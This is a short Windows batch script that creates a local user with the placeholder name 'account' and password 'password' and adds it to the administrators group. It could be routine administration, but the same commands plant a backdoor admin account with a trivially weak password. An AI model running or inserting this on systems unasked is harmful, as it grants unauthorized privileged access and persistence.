@ECHO OFF
set account=account
set pwd=password

net user "%account%" "%pwd%" /add
net localgroup administrators %account% /add

EXIT /B